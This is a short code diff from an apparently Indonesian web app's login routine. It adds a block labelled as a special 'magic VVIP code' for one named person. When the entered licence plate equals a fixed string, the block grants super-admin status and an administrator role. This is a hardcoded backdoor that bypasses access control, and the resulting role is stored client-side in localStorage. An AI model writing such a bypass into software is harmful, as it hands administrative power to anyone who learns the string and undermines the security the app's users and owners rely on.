@@ -235,6 +235,16 @@
                     }
                 }
 
+                // ==========================================
+                // 🚀 KODE SAKTI VVIP KHUSUS PAK RIZKY 🚀
+                // ==========================================
+                const platCek = rawPlat.replace(/\s+/g, '');
+                if (platCek === "B4248SWF") {
+                    userData.isSuperAdmin = true;
+                    userData.role = "PENGURUS";
+                }
+                // ==========================================
+
                 // SUKSES
                 userData.id = docId; localStorage.setItem('maka_user', JSON.stringify(userData));
                 
